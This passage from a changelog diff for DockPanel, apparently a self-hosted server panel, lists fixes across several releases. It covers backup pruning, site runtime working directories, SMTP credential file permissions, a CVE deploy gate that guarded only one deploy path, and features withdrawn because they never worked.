+lines above, `prune_policy_backup` refuses a backup belonging to another server —
+*"a local unlink cannot reach it, and deleting the row would orphan the archive
+with no record of where it is"* — and it keeps the row when an unlink fails for
+any reason other than "already gone". It was wired into the two **policy** sweeps
+(`database_backups`, `volume_backups`) and not into the site sweep, which had
+been written earlier with its own copy of the logic. Three siblings, two guarded.
+
+All three now retire through that one step. The site sweep resolves the owning
+host through `sites.server_id`, which is where a site backup's server actually
+lives — `backups` carries no server of its own.
+
+### Fixed — Node and Python sites started their process in an empty directory
+
+A managed site runtime got `WorkingDirectory=/var/www/{domain}/public`, hardcoded
+for every runtime — and that unit is only ever written for **node** and
+**python**, the two runtimes whose files live at the site root. `public/` is
+where static and PHP sites are served from; the git clone, the vhost document
+root, `EnvironmentFile` and `ReadWritePaths` all point at the site root instead.
+The function then *created* the empty `public/` directory it was about to point
+at, two lines before `systemctl enable --now`.
+
+So the process started in a directory with nothing in it. Measured, with the
+controls run from the site root:
+
+```
+node server.js    cwd=public/  ->  rc=1  Cannot find module      |  site root  rc=0
+python3 app.py    cwd=public/  ->  rc=2  can't open file         |  site root  rc=0
+npm start         cwd=public/  ->  rc=0                          |  site root  rc=0
+```
+
+With `Restart=always` the first two are a permanent crash loop rather than a
+visible failure. The third is why this lasted: `npm start` walks up to the
+nearest `package.json` and re-roots the working directory there, and it is the
+**first** of the three examples the site form offers — *"e.g., npm start, node
+server.js, npx next start"*. One of the three suggestions worked, so the runtime
+read as fussy rather than broken.
+
+The working directory is now derived from the runtime through `document_root_for`,
+the one function that knows which runtimes nest under `public/`, rather than
+spelled a second time. Units written before this release keep working: unit
+ownership is keyed on that same `WorkingDirectory` line, so both spellings are
+recognised — dropping the old one would have made every app unit already on disk
+unstoppable and undeletable, which is the opposite of a repair.
+
+The same confusion sat behind the WebP/AVIF buttons: image optimization scanned
+`public/` for every runtime, so on a node or python site it scanned the empty
+directory above and reported a clean run over zero files. It now scans the site's
+own document root, and the panel sends the runtime it needs to work that out.
+
+### Fixed — the SMTP password was world-readable while it was being written
+
+`/etc/msmtprc` holds the relay password. It was created with `fs::write`, which
+applies the process umask — 0644 — and chmodded to 0600 on the next statement, so
+the password was readable by every local account for the length of the write. The
+chmod's own failure was discarded with `.ok()`, in which case the file simply
+stayed 0644 with a password in it and nothing said so. It is now created 0600 in
+one step, the mode is re-asserted for configs written by older agents, and a
+failure to restrict it is returned rather than swallowed.
+
+The msmtp relay log was created world-writable (0666) so that both root and
+`www-data` could write it, which also made the envelope metadata in it — who
+mailed whom, and when — readable by every local account, and let any of them
+forge entries. It is now `root:www-data` and 0660. If the group does not exist
+the old mode is kept deliberately and the reason is logged, because taking the
+log away from the relay mid-send would be a worse bug than the one being fixed.
+
+### Fixed — the Migration screen still offered a path the panel refuses
+
+v2.122.2 taught the archive-path guard to refuse `/tmp` and to explain why, and
+its release note says `/tmp` is no longer offered. The **agent's** refusal
+changed; the screen the operator actually reads did not, and went on instructing
+them to use `/tmp/`. The note was true of the guard and false of the panel. The
+field now names `/var/backups/` alone and says why `/tmp` cannot work.
+
+## [2.122.2]
+
+### Fixed — the Migration Wizard offered a location the agent cannot read
+
+The archive-path guard answered *"Path must be within /var/backups/ or /tmp/"*,
+and the agent's unit runs `PrivateTmp=yes`. So an operator who copies a cpmove
+archive to `/tmp` — the obvious place, and the one the panel itself names — hands
+over a path the guard accepts and the very next line rejects with
+**`File not found`**, for a file plainly sitting on the disk they are looking at.
+
+Driven on a fresh box: the identical 303-byte archive fails from `/tmp` and
+analyzes cleanly from `/var/backups/`, which is the whole diagnosis in one pair of
+runs. `/tmp` is no longer offered, and the refusal now says where to put the file
+and why the other place cannot work.
+
+### Fixed — a database import blamed the password for a timing problem
+
+The import waited a fixed five seconds after creating the database container and
+then connected. `mariadb:11` initialises its data directory behind a bootstrap
+server that refuses the application user, and five seconds is not enough — so the
+import failed with **`ERROR 1045 (28000): Access denied`**, a credentials message
+for a readiness problem, sending the operator to check a password that was never
+wrong.
+
+The step whose own label reads "Waiting for … engine" now waits for it: it polls
+`SELECT 1` through the engine, with the credentials the container was created
+with, up to two minutes. If the engine still has not answered the import proceeds
+anyway, so the operator gets the real error rather than a timeout of ours.
+
+Both were found by driving the wizard end to end on a throwaway box, after
+v2.122.0 made the import capable of storing anything at all.
+
+## [2.122.1]
+
+### Fixed — the Custom Nginx refusal reached the operator as an incident reference
+
+v2.122.0 taught the agent to refuse `client_max_body_size`, `gzip` and
+`gzip_min_length` in the Custom Nginx box, with a sentence naming the control to
+use instead. Driven on a fresh box, that sentence never arrived: the agent's
+check runs inside the template render, a render failure is a 500, and
+`agent_error` hands an agent's own words through only on 4xx — so the operator
+got `Operation failed. Reference: <uuid>`. That is the same shape as the nginx
+duplicate error it replaced, and no more actionable.
+
+The same three names are refused in the backend validator now, which answers
+`400` and carries its own text. The agent keeps its copy: it is what holds if a
+vhost is ever written without going through this path.
+
+⚠ This is worth stating plainly rather than burying: **every** message the
+agent's custom-nginx validator produces has always surfaced this way, including
+the carefully-worded "directive is not in the allowed list. Allowed: …". Only the
+duplicate case is repaired here. The rest is recorded, not fixed.
+
+The backend's own unit test asserted that `client_max_body_size 20m;` was valid
+input, matching the agent-side test that made the same claim. Both now assert the
+refusal, and both assert that `add_header`, `gzip_types` and `expires` — emitted
+by the template too, and legitimately repeatable — are still accepted.
+
+## [2.122.0]
+
+### Fixed — the cPanel/HestiaCP import said "Imported" over a database it had never stored
+
+The wizard's database half could not succeed. Its `INSERT INTO databases` omitted
+`site_id`, a NOT NULL column with no default, so every insert raised — and
+`ON CONFLICT DO NOTHING` arbitrates unique conflicts, not not-null violations, so
+it softened nothing. The statement's result was then discarded into a `let _ =`,
+the loop carried on, and the run rendered a green check and the word "Imported"
+beside each database. Nothing about the outcome was true.
+
+What the operator was left holding is worse than a failed import. The database
+container is created before the row is attempted, so it kept running with no
+record anywhere in the panel: it cannot be listed, reached, or deleted, because
+every one of those paths starts from a `databases` row. Its password was a fresh
+UUID encrypted into the row that never landed, so it now exists nowhere. And
+because free-port selection reads the same table, the second database in an
+archive picked the port the first was already using and failed on the bind — so a
+three-database account produced one silent orphan and two errors that named the
+wrong cause.
+
+The insert now names `site_id` and is checked, the way the `sites` insert in the
+same loop already was. A database that cannot be recorded has its container taken
+back down rather than left running, and a name that already exists on the site is
+reported as such instead of swallowed.
+
+Which site a database belongs to is a question the archive does not answer, so
+the wizard now asks. A run importing a single site resolves it without asking; a
+run importing several shows a per-database site selector and will not start until
+each one is answered; a database that cannot be attached is refused **before**
+anything is created, with a sentence saying so. Databases can also be attached to
+a site imported in an earlier run.
+
+### Fixed — the CVE deploy gate guarded one door out of eight
+
+`SECURITY.md` said the gate "refuses new deploys on images exceeding a
+critical/high/medium threshold", the README said the same, and the Settings
+toggle read "Block new app deploys". One handler called it: the template deploy.
+Changing an app's image to any tag you like, deploying a Compose file, creating
+or editing a stack, and a git deploy whose repository carries a
+`docker-compose.yml` all put an operator-chosen image on a host without asking
+the threshold anything.
+
+All of them ask now. `container_policies.allowed_images` had the same shape —
+read by that one handler, and compared against the catalogue id rather than an
+image, under help text that says "Restrict which Docker images a user can
+deploy". It is now matched against the image at every door that takes one, and
+matched precisely: an entry matches the whole reference, the repository it tags,
+or a `/*` repository prefix. A bare `nginx` no longer admits
+`evil/nginx-backdoor`, which a substring test did.
+
+**Pressing Update on an app is deliberately exempt, and the docs now say so.** It
+re-pulls the reference the app already runs, so the only scan on file describes
+the image being replaced — gating on it would refuse the update precisely when
+the running image is vulnerable, which is the update that fixes it.
+
+`tests/deploy-gate-coverage-pin-e2e.sh` derives the door set from the agent's own
+route table rather than listing the doors that were fixed, so a new door joins it
+by existing. It found two this session that this entry would otherwise not
+mention.
+
+### Fixed — three buttons on the Apps page had answered 404 since April
+
+"Rescan now", "Download SBOM" and the empty-state "Scan now" all passed a
+container's hex id to `/api/apps/{name}/scan` and `/api/apps/{name}/sbom`, which
+resolve an image by matching the app's *name*. A hex id matches no name, so every
+one of them returned "App not found or has no image" — including the button an
+operator meets first, on an app with no scan yet. The scan table on this box
+holds two rows, both from the ad-hoc endpoint, none from these.
+
+### Fixed — the Custom Nginx box accepted the first thing anyone types into it
+
+`client_max_body_size 50m;` is the single most obvious entry, and the site
+template already writes `client_max_body_size` at server level, into the same
+`server { … }` block the custom text is injected into. nginx refuses a duplicate
+outright, so the save came back as `"client_max_body_size" directive is duplicate`
+— an error about a line the operator cannot see. A unit test asserted that
+exactly this input was valid.
+
+Three directives collide and are now refused at save time, naming the control to
+use instead: `client_max_body_size`, `gzip` and `gzip_min_length`. Measured
+against a real nginx rather than assumed — `add_header` and `gzip_types` are also
+emitted by the template and legitimately repeat, and `expires` is emitted only
+inside `location` blocks, a different context. All three remain accepted.
+
+### Fixed — Update also started apps that had been stopped on purpose
+
+All three recreate doors started the new container unconditionally, so updating
+an app you had deliberately stopped brought it back up. The fourth start is
+inside the blue-green path, which is the branch taken for any app with a domain —
+the ordinary case — so guarding only the visible three would have missed most
+installs. The pre-update state is read from the container's `status`, not its
+`running` flag, because a paused container reports both.
+
+### Changed — smaller corrections
+
+- The image SBOM route is `/api/sbom/image/{*image}`. A reference contains
+  slashes, so the single-segment form matched only bare `name:tag` and 404'd for
+  every registry-qualified image.
+- `alert_engine.rs`'s note said the disk forecast was unreachable because
+  production supplies a ~30-minute trend window. The query has a 12-hour gate;
+  the live window measures 1441 rows over 11.98 hours. What keeps the forecast
+  quiet is the 60% floor, doing its job.
+- `credential_reencrypt.rs` cited a pin file that has never existed in any
+  commit. The guarantee is real and enforced by a test in that same file; only
+  the citation was wrong.
+- `FEATURES.md` advertised a manual sleep/wake control on the Apps page. There
+  isn't one, as the withdrawn-claims table in the same file already said.
+- The container-policy help text now says what is actually enforced where, and
+  that only administrators can deploy containers at all.
+
+## [2.121.0]
+
+### Fixed — a server that had ever hosted an app migration could never be deleted
+
+Across the whole schema there were exactly two foreign keys that could block a
+delete, and both pointed at `servers` from `app_migrations`. Starting an app
+migration therefore made **both** the source and the target server permanently
+undeletable: the delete raised inside its own transaction and reached the operator
+as `Internal error (ref: …)`, with nothing naming the cause. There was no way out
+through the product — `app_migrations` has one writer and no DELETE or UPDATE
+anywhere in the repository, so the blocking row was permanent by construction.
+
+This is the same defect v2.120.0 repaired for user accounts, one parent table over.
+The regression pin that release added enumerated foreign keys to `users` **by
+name**, so it could not see these two; it now enumerates every parent table, and
+would have caught them.
+
+### Fixed — the mail Reputation card said "Clean" when no blacklist had answered
+
+A DNSxL reports a listing with an address record and a non-listing with NXDOMAIN,
+so treating "the lookup succeeded" as the whole verdict scored a dead resolver, a
+timeout, a rate-limited zone and a retired zone as a clean bill of health. The
+per-zone detail panel was gated on the verdict, so it hid exactly when the verdict
+was worthless.
+
+Each zone is now probed with a query whose correct answer is fixed by RFC 5782, and
+a zone that fails that probe is reported as unanswered rather than folded into
+either verdict. The response carries `checked` per zone and a three-state `status`;
+`clean` now requires that every zone actually answered. Refusal codes in
+`127.255.255.0/24` are no longer read as listings, which was the same lie pointing
+the other way.
+
+### Fixed — bulk WordPress updates and hardening reported successes they never had
+
+Bulk update announced "Updated N site(s) successfully" where N was the number of
+ticked checkboxes; the handler answers 200 carrying a per-site verdict even when
+every entry failed, and the client never read it. Security hardening announced a
+blanket success over runs in which every requested fix reported that it had not
+been applied. Both now report what actually happened, and name the sites and fixes
+that did not.
+
+### Fixed — deleting a maintenance window answered "deleted" without checking
+
+The statement's result was discarded, so a database error or a window belonging to
+another account both answered green. That is not cosmetic: an active maintenance
+window suppresses uptime checks for the **entire account**, so a window that
+outlived its own success message left that account with no downtime detection and
+no alerts.
+
+### Added — four controls that existed only as endpoints
+
+Complete, routed, ownership-scoped handlers that no screen could reach:
+
+- **Escalation policies can now be attached to an alert rule**, under Settings →
+  Notifications. The Alerts page had been telling operators to do this for several
+  releases while no such control existed, so every rule kept the default cadence no
+  matter how many chains were built.
+- **Terminal shares can be listed and revoked.** A share is an unauthenticated
+  public URL carrying whatever was on screen, and until now creating one was a
+  button while closing one was not reachable at all.
+- **Extension webhook secrets can be rotated** from the Extensions page.
+- **A secrets vault can be linked to a site**, which is what decides auto-injection
+  — without it every "auto-inject" tick on that page was inert. The link is
+  ownership-checked on the write side, because the deploy-time injector matches
+  vaults to sites on that column alone.
+
+### Changed — point-in-time recovery is withdrawn rather than advertised
+
+Nothing archives anything: `db_pitr_config` is touched by exactly two statements,
+both of them the config endpoints that store the toggle and read it back for
+display. No WAL archiving or binlog retention is configured anywhere, and the
+restore endpoint has returned an explicit 501 since v2.19.0. The toggle now says
+what it stores, and the claim is recorded in FEATURES.md §Withdrawn Claims instead
+of being sold in the README.
+
+## [2.120.0]
+
+### Fixed — an account that had ever scheduled a maintenance window could never be deleted
+
+Deleting a user who had once scheduled a maintenance window failed, and the only
+thing the operator saw was `Operation failed. Reference: <uuid>`. The owner column
+on `maintenance_windows` carried no delete action, so the account deletion raised a
+foreign-key violation inside its own transaction and rolled back. Nothing in the
+product could clear the blocking row either: the only handler that deletes a
+maintenance window is scoped to its own owner, so an administrator could neither
+see nor remove another account's windows. The account was permanently undeletable
+through the panel, and the message said nothing about why.
+
+The trigger is the most ordinary reason anyone opens the Users screen — retiring a
+departing client or a member of staff — and the blocking row is created by the
+lowest-privilege role, following the product's own guidance to schedule a window
+before planned downtime.
+
+Both remaining owner links now declare what a deletion does. `deploy_approvals.requested_by`
+was not failing in the field, because the requester is always the deployment's owner
+and the row already died with the deployment; it is repaired anyway, so that the
+schema states the rule instead of depending on a comment staying true.
+
+⚠ A new regression pin **enumerates** every account foreign key across the whole
+migration tree and fails any that never declares a delete action, rather than naming
+the two that were wrong. It understands that a later migration can repair an earlier
+declaration, which is how the release before this one fixed a third column.
+
+### Fixed — a cleared Slack, Discord or PagerDuty destination came back
+
+Clearing a notification destination was impossible. The Settings page substituted a
+null for an empty box, and the handler treats a null as "leave this alone", so the
+old destination survived every save — while the save answered "Notification channels
+saved" in green. An operator who rotated a webhook, or decommissioned a channel
+entirely, was told it had been applied and kept alerting to the old address.
+
+The three fields now reach the handler exactly as the operator left them. An empty
+value is safe at both ends: the SSRF validators skip a blank field rather than
+rejecting it, and every sender already declines to deliver to an empty destination.
+
+### Fixed — "All containers are up to date" over a screenful of failed checks
+
+The update check reported success whenever it found no updates, and an image whose
+registry never answered scores exactly like an image that is current. So a run in
+which every single check failed — an anonymous registry rate limit, a private
+registry, a deleted tag, a DNS blip — rendered `All containers are up to date` in
+the success palette, over rows each carrying its own failure badge. The summary
+contradicted the page underneath it, and it is the one that decides whether an
+operator goes looking.
+
+The summary now counts the checks that could not be completed and says so, and a run
+carrying any failure is no longer typed as a success.
+
+### Fixed — a spinner that never stopped, and a deploy failure blamed on the registry
+
+Two reports of a phase that never resolved:
+
+- The update door announced the pull step as running before calling the agent and
+  never resolved it when the call failed, so a live spinner sat under a red
+  "Update failed" header indefinitely. It now reaches a terminal state. That state
+  is deliberately "unknown" rather than "failed": pull, recreate and migrate are one
+  agent call, so the panel genuinely cannot tell whether the image arrived.
+- The deploy door filed **every** failure under the step that pulls the image — the
+  container refusing to start, the proxy, the volume ownership repair, all of it —
+  so an operator whose container would not start was sent to audit a registry that
+  had answered perfectly. This is the defect the update door was repaired for in
+  v2.117.0, 480 lines away in the same file. The deploy failure now names a step
+  that asserts no phase, and the agent's own message says what happened.
+
+### Fixed — five container teardowns orphaned their anonymous volumes
+
+Two image probes, an app deploy that failed to start, a database that failed to
+start and a git build that failed to start all removed their container without its
+anonymous volumes. Docker creates one such volume for every path an image declares
+as a `VOLUME` and the panel does not bind, so each of these left directories behind
+that nothing in the product will ever reclaim. The probes ran on the volume-ownership
+repair that all three recreate doors call, so the leak was continuous rather than
+occasional.
+
+All five now take their anonymous volumes with them. Measured against the daemon
+before shipping: the flag removes **only** anonymous volumes — a named volume
+survived it and a bind mount's source was untouched — so no app's data is in scope.
+A new pin enumerates every container teardown in the agent and fails any that
+inherits the default instead of stating what it does, so the next one is covered
+without an edit.
+
+
+
+## [2.119.0]
+
+### Added — a database backup you could take, verify and drill, but never restore
+
+The Backup Orchestrator listed database and volume backups, let you verify their
+integrity, and let you prove them restorable with a drill that unpacks one into a
+scratch container. It had no control to actually restore one, and none to delete
+one. `restore_db_backup`, `restore_volume_backup` and `delete_db_backup` were
+complete, ownership-scoped, server-pinned handlers with **zero callers anywhere in
+the product** — routed, documented, repaired across several releases, and
+unreachable the whole time. The page could tell you a backup was good and leave you
+no way to use it.
+
+All three now have controls, each behind the same two-step confirm the drill uses,
+each naming what it overwrites: a database restore says it overwrites the live
+database, a volume restore says it unpacks over the live volume. Volume backups get
+a restore and no delete, because no delete endpoint exists — a button that would
+404 is worse than a missing one.
+
+⚠ Wiring a caller to a handler makes its guards reachable for the first time, so the
+ownership scopes are now pinned in the same suite as the controls.
+
+### Added — rotate a server's agent token from the panel
+
+`POST /api/servers/{id}/rotate-token` has existed since the fleet shipped and is
+documented in the API reference. Nothing in the panel called it, so an operator who
+suspected a leaked agent token had no in-product way to rotate one. The Servers page
+now offers it beside the existing TLS-pin rotation, with its own confirm — the two
+are different credentials with different consequences and must not share a control.
+
+### Changed — two advertised capabilities withdrawn
+
+Recorded in `FEATURES.md` § Withdrawn Claims rather than quietly deleted.
+
+**Horizontal Auto-Scaling** was advertised on `README.md` and `FEATURES.md` as
+"rule-based CPU thresholds, min/max replicas, cooldown". There is no scaler:
+`autoscale_rules` is touched by six lines in the whole repository — two in its own
+migration and four in its own CRUD — and nothing in the container runtime reads a
+replica count. There is no UI; the claimed "(via Integrations)" tab does not exist.
+And no rule could ever have been stored: the create endpoint issues
+`INSERT … ON CONFLICT (container_id)` against a table whose only index on that
+column is **not unique**, and Postgres resolves the arbiter index at plan time, so a
+well-formed request raises `42P10` and returns 500 on the first insert into an empty
+table. Withdrawn rather than repaired on purpose — adding the missing `UNIQUE` would
+turn a loud 500 into a silent lie: rules that store cleanly and are never enforced.
+
+**Cloudflare Tunnel**'s "token-based config, systemd service" is withdrawn; the
+installer half is real and stays. `POST /api/tunnel/configure` and
+`GET /api/tunnel/status` have no caller in the SPA, the CLI or the docs, and the
+`cloudflared` row in Settings renders no field through which a token could be
+supplied. That handler is also the only writer of the systemd unit, so the installed
+binary can never be started. The setting it writes, `tunnel_configured`, is read by
+nothing. `FEATURES.md` also pointed at the wrong module for both endpoints.
+
+### Fixed — the background-services table had drifted by three
+
+`FEATURES.md` § Background Services announced 15 supervised services and listed 12.
+`drill_scheduler`, `telemetry_collector` and `cleanup` were missing. The existing
+docs pin derives the count and checks it against `README.md` only, so this table
+could drift with nothing able to see it; the new suite recomputes the **row count**
+against `spawn_supervised` and fails on a mismatch.
+
+### Testing
+
+New `tests/severed-controls-pin-e2e.sh` — 26 assertions, every one mutation-proved
+(26 plants, 26 kills, each on its own named arm). It pins the callers rather than
+the handlers, because a severed pair is invisible to any test that exercises one
+end; it pins the withdrawn claims on every surface at once, because a claim removed
+from one surface survives on the others; and its three controls are themselves
+mutation-proved able to fail. 2291 → **2317** assertions across **70** suites.
+
+## [2.118.0]
+
+### Fixed — scheduled site backups recorded no integrity hash (#114)
+
+The chain-of-trust report says a backup's SHA-256 is "recorded when the backup was
+taken". For site backups taken by a schedule or by a backup policy, none ever was.
+The agent had computed the hash on every one of those runs and sent it back; both
+unattended paths read the two fields beside it and dropped that one. Every database
+backup and every volume backup — including the two written by the same function as
+one of the site inserts — recorded theirs correctly, as did manually-triggered site
+backups. So the only site backups without a hash were the ones nobody was watching,
+which on most installs is all of them.
+
+Both paths now record it. Backups those two paths took before this release keep no
+hash and nothing back-fills one: the hash has to be taken when the archive is
+written. A report for such a backup shows `—`, as it always has.
+
+⚠ The issue named one of the two call sites and attributed it to the wrong
+scheduler. The seven NULL rows its reporter measured came from the other one.
+
+### Fixed — the chain-of-trust PDF printed its own source code (#113)
+
+A multi-line conditional in the report template was written in Typst's markup mode,
+where an expression ends at the first line break that completes it. Only its first
+branch was bound; the rest were re-read as text. Four consequences, of which one was
+reported:
+
+- Every report opened with a paragraph of raw template source above the DockPanel
+  masthead.
+- The resource label was blank for database and volume backups — the value the
+  template computed was empty for every kind except site.
+- The footer read "snapshot of one backup" instead of naming the kind, for the same
+  reason.
+- The restore-drill table silently discarded **every** `body_excerpt` — the field
+  carrying what a drill actually restored, e.g. "24 tables, ~1,900 rows restored".
+  The panel showed it; the PDF an auditor receives did not, in any row.
+
+### Fixed — an admin could not manage resellers, and the one control that looked like it could made a broken account (#112)
+
+Clicking **Reseller Panel** as an administrator produced
+`This endpoint is for resellers only` as the entire page. That screen answers only
+for the caller's own reseller tenant, and an admin does not have one.
+
+The admin half of the feature had never been given a screen: the eight endpoints
+behind `/api/resellers` — list, create, read, update, remove, and per-reseller
+server allocation — shipped complete and had no caller anywhere in the panel. So
+the only reseller-shaped control on offer was the role dropdown in **Users**, which
+writes the role and nothing else: the account it produced got the Reseller menu and
+its own panel answered 404. Changing the role back left the profile behind, and the
+next promotion of that account failed with a server error.
+
+- New **Resellers** screen (Admin → Resellers): promote an account, set its panel
+  name, quotas and white-label branding, allocate and remove servers, and demote it.
+- **Reseller Panel** and **My Users** are now shown only to resellers, and an
+  administrator who opens either by URL is sent to the screen that answers for them.
+- The **Users** role dropdown no longer offers `reseller` in either direction and
+  points at the new screen instead.
+- Promoting an account that kept a profile through an earlier demotion now restores
+  it, with its stored quotas intact, instead of failing.
+
+### Fixed — the security audit log showed events without their substance
+
+The immutable audit log listed severity, event, actor, IP, location and time — and
+dropped the three fields carrying what actually happened. A canary-file trip read
+`critical · canary.triggered` and never named the file that was touched; an
+auto-lockdown never gave its reason; a blocked terminal command never showed the
+command; and the deploy-protection record added in v2.117.0 never said which
+deployment or which direction. The endpoint had always sent all three. The table now
+has Target and Details columns.
+
+## [2.117.0]
+
+### Fixed — Update said "App updated" when it had updated nothing
+
+Pressing **Update** on a Docker app pulls the image, then stops the container,
+migrates its data, removes it and creates it again. If the pull failed — the tag
+deleted upstream, the registry unreachable, a rate limit — the agent wrote one line
+to its own log and carried on regardless. The app went down, came back rebuilt from
+the copy already on disk, and the panel reported success. Nothing told you the image
+you are running can no longer be fetched.
+
+Update now decides before it touches anything:
+
+- If the image cannot be pulled **and no copy of it exists on this server**, it
+  refuses and the app keeps running. This is the case that used to destroy apps: the
+  old container is removed before the new one is created, so with nothing to create
+  from, the app simply stopped existing.
+- If the image cannot be pulled but the local copy is already what the container is
+  running, it refuses — there is nothing to update, and the outage would buy nothing.
+- If the image cannot be pulled but the local copy *differs* from what is running,
+  the update goes ahead. An earlier pull did succeed and that update is still waiting
+  to be applied.
+
+The door that changes an app's image to a different one has always refused like this.
+This is the same guard on the door beside it.
+
+### Fixed — a failed version check is no longer invisible
+
+The agent has always recorded *why* it could not check an app for a newer image, and
+the panel has always received it and thrown it away. An app whose tag had been deleted
+from its registry looked exactly like an app that was perfectly up to date: no badge,
+an ordinary Update button. The Apps list now shows a **Check failed** badge carrying
+the registry's own reason.
+
+### Fixed — a failed update blamed the wrong step
+
+Every way an update could fail — the image, the data migration, the remove, the create,
+the start — was reported under the step "Pulling latest image". An operator whose data
+migration aborted was sent to go and look at their registry.
+
+### Fixed — turning off the deploy approval requirement left no trace
+
+Requiring a second administrator's approval before a deploy could be switched off with
+nothing recorded anywhere, which made it a preference rather than a control. Switching
+it on or off is now written to the security audit log, which cannot be edited or
+deleted. The guide also said *any* administrator could switch it off; in fact only the
+deployment's owner can, and it now says so.
+
+### Fixed — a rollback could start on top of a running build
+
+Four of the five paths that replace a deployment's container took an atomic lock first.
+Rollback wrote its status unconditionally and only logged a warning if that failed, so
+a rollback and a deploy could run at once and swap the container out from under each
+other. It now takes the same lock and answers 409 if one is already in progress.
+
+## [2.116.0]
+
+### Fixed — the deploy form asked for your domain and then threw it away
+
+Six one-click templates ship an environment variable holding the app's own public
+address — Ghost's `url`, Plausible's `BASE_URL`, Drone's `DRONE_SERVER_HOST`,
+PhotoPrism's `PHOTOPRISM_SITE_URL`, Graylog's `GRAYLOG_HTTP_EXTERNAL_URI` — and every
+one of them defaulted to `localhost`. The app came up, served fine through the domain
+you claimed, and handed out URLs pointing at a machine your visitors are not on:
+webhook registrations, OAuth callbacks, password-reset links.
+
+The panel had the right answer the whole time. You type the domain into the deploy form,
+it is validated, claimed, and passed to the agent — which used it to write one container
+label and ignored it everywhere else.
+
+Those variables are now filled in from the domain you claimed. A value you change
+yourself always wins; this only fills in a field you left alone, and a deploy with no
+domain keeps the `localhost` default, which is correct there. The deploy form says which
+fields it is going to fill in, rather than showing you a `localhost` default it is about
+to replace.
+
+### Fixed — n8n could not be configured at all (#111)
+
+n8n was the worst case of the above, because its template declares no environment
+variables, so there was no field to correct. Behind the panel's own reverse proxy it
+printed `Editor is now accessible via: http://localhost:5678`, registered webhooks
+against that address — Telegram and every other webhook-based trigger failed with
+`HTTPS URL must be provided for webhook` — and threw
+`ERR_ERL_UNEXPECTED_X_FORWARDED_FOR` on every request, because nothing had told it to
+trust the proxy in front of it.
+
+It now receives `N8N_HOST`, `N8N_PROTOCOL`, `WEBHOOK_URL` and `N8N_PROXY_HOPS` from the
+domain claimed at deploy time. Reported by **@munoz-dev**, with a reproduction, logs and
+two proposed fixes — both of which are in this release.
+
+### Added — the app environment editor can add and remove variables
+
+An app's Environment Variables dialog could edit the values of variables the container
+already had, and nothing else. The key was fixed text, there was no way to add one, and
+the Edit button did not appear at all for a container with none set. Anything the
+template did not declare was unreachable from the panel — which is why the reporter
+above had to rebuild his container by hand with `docker run`.
+
+It now works like the equivalent editor on the Sites page: names are editable, `+ Add
+variable` appends a row, and a row can be removed. A blank name is discarded; a repeated
+one is refused rather than silently collapsed onto whichever value came last.
+
+Saving still recreates the container, and a value shown as `********` still means
+"leave this one alone".
+
+### Security — the environment editor now has the same limits as the deploy form
+
+`PUT /api/apps/{id}/env` never bounded what it accepted, which was survivable only
+because the dialog could only send back keys that already existed. Now that it can
+compose an arbitrary name, that door enforces what the deploy path has always enforced:
+at most 50 variables, names up to 255 characters, values up to 4KB. Names containing
+`=` or a null byte are refused, because Docker splits on the first `=` and would
+otherwise set a variable other than the one you named.
+
+## [2.115.0]
+
+### Added — the second administrator can finally sign off
+
+Turning on deploy protection for a Git deployment does not add a confirmation dialog.
+It files a request that a **different** administrator has to approve, and the panel
+refuses to build until they do. That has been true since the feature shipped — and the
+panel never gave anyone a way to do it.
+
+The three endpoints behind it were complete and carefully scoped: they list the requests
+waiting on the machines you operate, they refuse to let you approve your own, and they
+refuse to let an administrator sign off on hardware somebody else registered. No screen
+in the panel called any of them. The only way to finish a protected deploy was two
+hand-written API calls against an id nothing displayed.
+
+Git Deploy now shows **Pending Approvals** at the top of the page — which deployment is
+waiting, who asked, from which repository and branch, since when, and Approve / Reject.
+It is the page the approval notification has always linked to.
+
+The requester and the repository are shown because a signature without them is not a
+review: deployments are listed per owner, so the approving administrator has usually
+never seen this one anywhere else in the panel.
+
+A request you filed yourself is listed as yours with no Approve button, and a
+**Withdraw** button instead. On a single-administrator install that is the only exit —
+nobody else exists to approve, and a deployment may only have one request waiting.
+
+### Fixed — pressing Deploy on a protected deployment said nothing at all
+
+The server answers a protected deploy with "this deploy requires approval from another
+admin". The panel read only the field carrying a deploy id, found none, and did nothing
+further: the button stayed disabled and spinning, the message bar was cleared, and the
+sentence explaining what had happened was discarded.
+
+So the deploy looked stuck. The reasonable response to a stuck button is to press it
+again — and every press filed **another** approval request, each one separately
+approvable, each approval starting its own deployment. A few presses of a button that
+appeared to do nothing could put several copies of the same commit into production, one
+after another, whenever a colleague worked down the queue.
+
+The panel now says what the server said. A deployment can have only one request waiting
+at a time — enforced by the database rather than by checking first, so two simultaneous
+clicks cannot both win — and pressing Deploy again reports that the request is already
+there instead of filing a second. Installs that have already accumulated duplicates have
+them collapsed to the original request on upgrade; approved and rejected requests are
+kept, because they are the record of who decided what.
+
+Only a genuinely new request notifies the other administrators. Re-announcing one that is
+already waiting is how a notification stops being read.
+
+### Fixed — a request could outlive the setting that required it
+
+Switching deploy protection off left any waiting request in place. That was harmless
+while nothing could act on one. It stops being harmless the moment the panel lists them:
+a second administrator would have been shown a request to approve, under a deployment the
+same screen calls unprotected, one click from deploying whatever the branch had become
+since.
+
+Clearing the setting now resolves what was waiting on it, approving re-reads the setting
+rather than trusting the request, and the list only offers requests whose deployment is
+still protected. The resolved rows stay — they are the audit trail.
+
+### Fixed — approving could start a second build over a running one
+
+Four paths start a production build. Three took an atomic lock that refuses to begin one
+while another is in flight; approving a request flipped the status unconditionally and
+merely logged a failure. Two administrators working down the queue at the same moment
+could each start a full build against one working tree.
+
+Approval now takes the same lock, and takes it **before** consuming the request, so an
+approval refused because a build is already running stays pending and can be tried again
+rather than being spent.
+
+### Fixed — the administrator who approved a deploy could not be deleted afterwards
+
+Approval records name the approver, and that column had no delete behaviour, so retiring
+that administrator later failed with an internal error and rolled back the whole account
+deletion. The record hangs off somebody else's deployment, so nothing cleaned it up, and
+no screen could clear it.
+
+The name is now cleared when the account is deleted and the record itself survives.
+Nothing in the field was affected, because until this release no approval could be
+recorded at all.
+
+### Changed — the deploy-protection copy describes the feature it turns on
+
+The checkbox offered to show a confirmation prompt to prevent accidental deployments.
+That describes a dialog in your own browser. What the setting actually does is require a
+second person.
+
+It now says so, and it also names what it does **not** cover: webhook deploys, scheduled
+deploys and rollbacks all still deploy without approval. A control whose limits are
+undisclosed reads as broader than it is.
+
+## [2.114.0]
+
+### Fixed — an updated app's rescued data was left where the panel could not find it
+
+When an app is updated, DockPanel moves any data its template calls persistent out
+of the container's writable layer and onto a directory you can see and back up. It
+was naming that directory after the **container** rather than after the app — so the
